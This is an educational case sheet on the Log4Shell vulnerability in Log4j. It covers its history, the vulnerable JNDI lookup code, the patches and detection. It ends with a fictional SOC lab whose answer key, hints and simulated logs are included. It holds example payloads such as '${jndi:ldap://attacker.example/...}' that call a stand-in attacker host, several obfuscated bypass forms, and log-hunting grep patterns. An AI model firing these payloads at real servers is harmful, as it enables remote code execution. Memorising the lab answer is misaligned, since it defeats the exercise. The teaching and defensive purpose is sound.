@@ -1,0 +1,132 @@
+tagline: December 2021: one line in a logging library that treated text as instructions. If the attacker could get a string into a log, the server would reach out and fetch the attacker's code. Real code, the patch history, and how to hunt it in logs.
+sheet: cases
+sources: Apache Log4j security page (CVE-2021-44228, 45046, 45105, 44832); Apache Log4j 2.15.0 to 2.17.1 release notes and commits (LOG4J2-3201, 3208, 3230, 3293); US Cyber Safety Review Board, *Review of the December 2021 Log4j Event* (July 2022); CISA Log4j guidance and scanner; Black Hat 2016, *A Journey From JNDI/LDAP Manipulation to Remote Code Execution Dream Land* (Muñoz and Mirosh); Cloudflare and Huntress write-ups; LunaSec's explainer.
+:: simple
+### The story
+**Log4j** is the most popular Java logging library: whenever an app writes a line like "user alice logged in", there is a good chance Log4j did it. A feature of Log4j 2 called **lookups** lets a log message contain placeholders like `${java:version}`, which Log4j replaces with a value. One of those lookups, `jndi:`, tells Java to **contact a directory server by URL** and fetch an object.
+
+If an attacker could get text like `${jndi:ldap://attacker.example/x}` into any log line, the server would make a network call to the attacker's server. Attackers could put that text in any field a site logs: the User-Agent header, a username, a chat message, a search box. Depending on the Java version and what was on the class path, the reply could lead to **remote code execution**.
+
+It was reported privately to Apache on **24 November 2021** by Chen Zhaojun of Alibaba Cloud. It went public on **9 December 2021** as **CVE-2021-44228**, scored **10.0 out of 10**, nicknamed **Log4Shell**. Minecraft servers were among the first hit (a chat message was enough). Within hours the internet was being scanned for it at scale, and ransomware and botnet crews adopted it within days.
+
+### Timeline
+- **2013:** the JNDI lookup feature is added to Log4j 2 (before version 2.0 final).
+- **24 Nov 2021:** private report to Apache.
+- **9 Dec 2021:** public exploit and CVE. **2.15.0** released the same day.
+- **13 Dec:** 2.15.0 found incomplete in some configurations; **2.16.0** (CVE-2021-45046) disables message lookups and JNDI by default.
+- **17 Dec:** **2.17.0** fixes a denial-of-service via recursive lookups (CVE-2021-45105).
+- **28 Dec:** **2.17.1** fixes CVE-2021-44832 (needs attacker control of the configuration file).
+- **Jul 2022:** the US Cyber Safety Review Board calls it an "endemic vulnerability" and says it will linger for years.
+:: mid
+### Where the bug lives
+Two things combine:
+1. **Message lookups.** In vulnerable versions (2.0-beta9 through 2.14.1), Log4j scanned the *finished message* for `${...}` and ran the lookup named inside. The message contained user-supplied text, so the user controlled which lookup ran.
+2. **The JNDI lookup.** `JndiLookup` passes the rest of the string to Java's naming API. If the string is `ldap://host/name`, Java connects to `host` and asks for `name`.
+
+### The vulnerable pattern in an application (simplified)
+```code
+// any handler that logs something the user sent
+String ua = request.getHeader("User-Agent");
+logger.info("request from agent {}", ua);
+// ua = "${jndi:ldap://attacker.example/a}" is expanded when the message is formatted
+```
+### The vulnerable library code (abridged from Log4j 2.14.1, `JndiLookup.lookup`)
+```code
+public String lookup(final LogEvent event, final String key) {
+    if (key == null) {
+        return null;
+    }
+    final String jndiName = convertJndiName(key);       // "ldap://attacker.example/a"
+    try (final JndiManager jndiManager = getManager()) {
+        return Objects.toString(jndiManager.lookup(jndiName), null);   // connect and fetch
+    } catch (final NamingException e) {
+        LOGGER.warn(LOOKUP, "Error looking up JNDI resource [{}].", jndiName, e);
+        return null;
+    }
+}
+```
+### Line by line
+1. `key` is whatever was inside `${jndi: ... }`. It came from the attacker.
+2. `convertJndiName` only normalises it (adds a `java:comp/env/` prefix to bare names; **URLs with a scheme like `ldap:` pass straight through**).
+3. `jndiManager.lookup(jndiName)` makes the outgoing call: `ldap://`, `rmi://`, or `dns://`.
+4. The result is turned into a string and substituted in the log line. In older Java versions the response could point to a **remote class** that the JVM would load and run. Newer JDKs (8u191 and later) switched that off by default, but attackers moved to alternative paths that deserialize objects that happen to be on the class path ("gadgets").
+
+No authentication, no special access, one string in one field. That is what made it so bad.
+
+### The fix, in stages
+- **2.15.0:** restricts JNDI lookups (to local hosts and a short list of protocols) and stops them from loading remote classes by default. This closed the original path but left holes in non-default setups.
+- **2.16.0:** **removes message lookups** completely and disables JNDI by default.
+- **2.17.0 / 2.17.1:** close the later recursion and configuration issues.
+- **Interim mitigations:** setting `log4j2.formatMsgNoLookups=true` (later shown to be incomplete), **deleting `JndiLookup.class` from the jar**, blocking outbound LDAP/RMI at the egress firewall, and WAF rules for `${jndi:` (which attackers bypassed with obfuscation).
+:: complex
+### Why it was hard to clean up
+- **Hidden inside other products.** Log4j is a library, so it hides in an app's `lib/` folder, in fat JARs, in vendor appliances. Companies first had to answer "where do we even use it?" (an SBOM answers that).
+- **A long tail of vendors** needed to patch their own products.
+- **Obfuscation.** Because Log4j resolves nested lookups, an attacker can hide the keyword: `${${lower:j}ndi:...}`, `${${::-j}${::-n}${::-d}${::-i}:...}`, or `${${env:NaN:-j}ndi...}`. A plain search for `jndi` misses these.
+
+### Detection
+**Logs** (anywhere a user can send text: web access logs, WAF, application logs, DNS):
+```
+grep -E '\$\{[^}]*j[^}]*n[^}]*d[^}]*i' access.log      # rough, catches many obfuscations
+grep -F '${jndi:' access.log                              # the plain form
+```
+**Network:** outbound connections from a server to unusual hosts on ports 389, 636, 1389, 1099 (LDAP/RMI); **DNS queries** for odd names that were produced by the server. Defenders used **DNS canary tokens**: if your canary domain shows up, someone sent a payload and the server resolved it. This also tells you **which servers are vulnerable**, since only a vulnerable one makes the lookup.
+**Host:** a Java process spawning a shell, `curl`, `wget`; new outbound connections from the app user; unexpected scheduled tasks.
+**Software:** scan for log4j-core JARs between 2.0-beta9 and 2.14.1 (Syft, Grype, CISA's scanner, or `find / -name 'log4j-core*.jar'`).
+
+### The toy version of the idea (safe, fictional)
+```code
+# A tiny "logger" with the same design mistake: expand ${...} in the final message
+def log(template, user_text):
+    msg = template.replace("{}", user_text)       # user text is now part of the message
+    return expand_lookups(msg)                    # ...and the logger treats it as a program
+# fix: expand placeholders only in the developer's template, never in user data
+def log_safe(template, user_text):
+    return expand_lookups(template).replace("{}", user_text)
+```
+Same bug class as SQL injection and prompt injection: **data and instructions share a channel**.
+
+### Defensive lessons
+- **Log libraries should log, not interpret.** Features that execute things from data are attack surface (the same lesson as XML external entities).
+- **Egress filtering:** servers rarely need to call out to arbitrary hosts. Block it, and this class of attack has nowhere to phone home.
+- **Keep an SBOM** so you know where a library is within hours, not weeks.
+- **Open source needs maintainers.** The Log4j team were volunteers who patched around the clock over the holidays.
+- **A bug's severity is about reach:** a mundane library used everywhere beats a famous product used in one place.
+:: ref
+### at a glance
+CVE | CVE-2021-44228 (also 45046, 45105, 44832)
+Public | 9 December 2021 (private report 24 November 2021)
+Affected | log4j-core 2.0-beta9 through 2.14.1
+Fixed | 2.15.0 (partial), 2.16.0 (message lookups removed), 2.17.0, 2.17.1
+CVSS | 10.0
+Bug class | untrusted input interpreted as code/lookups; CWE-917 (expression language injection), CWE-502, CWE-20
+Trigger | any attacker-controlled string that reaches a Log4j call: "${jndi:ldap://...}"
+Mitigations | upgrade to 2.17.1+, remove JndiLookup.class, block outbound LDAP/RMI, patch vendor products
+Detect | search logs (including obfuscated forms), DNS canaries, outbound LDAP/RMI connections
+:: lab
+host: soc
+user: analyst
+cwd: /home/analyst
+:: brief
+**Scenario (fictional, simulated):** it is 10 December 2021. `~/logs/access.log` is a web server access log and `~/logs/dns.log` is the resolver log. Someone sent `jndi` strings at the site. Only a **vulnerable** server would resolve the attacker's domain `callback.attacker.example`. Find the **internal host** (an `10.0.x.x` address) in `dns.log` that looked up that domain. Submit its IP, e.g. `submit 10.0.0.5`.
+:: answer
+10.0.4.22
+:: hint
+First see what was sent: `grep -F 'jndi' ~/logs/access.log`. Now find who resolved the callback name: `grep attacker ~/logs/dns.log`.
+:: hint
+The access log shows requests to several servers. Only one server's resolver made the lookup.
+:: solution
+The DNS log shows `10.0.4.22` resolving `a1b2.callback.attacker.example`, which means the Java app on that host expanded the `${jndi:ldap://...}` string it logged and tried to contact the attacker. The other targeted hosts (`10.0.4.10`, `10.0.4.31`) received payloads but never called back, so they were patched or not using Log4j. Next steps: isolate `10.0.4.22`, look for follow-on outbound connections and processes, upgrade log4j to 2.17.1, and hunt for the obfuscated forms (`${${lower:j}ndi`) in the same logs.
+:: verify
+grep attacker ~/logs/dns.log
+:: file /home/analyst/logs/access.log
+203.0.113.7 - - [10/Dec/2021:09:14:02] "GET /login HTTP/1.1" 200 "Mozilla/5.0" -> 10.0.4.10
+198.51.100.9 - - [10/Dec/2021:09:14:09] "GET / HTTP/1.1" 200 "${jndi:ldap://a1b2.callback.attacker.example/x}" -> 10.0.4.22
+198.51.100.9 - - [10/Dec/2021:09:14:11] "GET / HTTP/1.1" 200 "${jndi:ldap://a1b3.callback.attacker.example/x}" -> 10.0.4.31
+198.51.100.9 - - [10/Dec/2021:09:14:12] "GET / HTTP/1.1" 200 "${${lower:j}ndi:ldap://a1b4.callback.attacker.example/x}" -> 10.0.4.10
+203.0.113.15 - - [10/Dec/2021:09:15:40] "GET /search?q=cats HTTP/1.1" 200 "Mozilla/5.0" -> 10.0.4.10
+:: file /home/analyst/logs/dns.log
+09:12:44 10.0.4.10 query library.example A
+09:14:10 10.0.4.22 query a1b2.callback.attacker.example A
+09:14:12 10.0.4.31 query updates.example A
+09:15:02 10.0.4.10 query cdn.example A
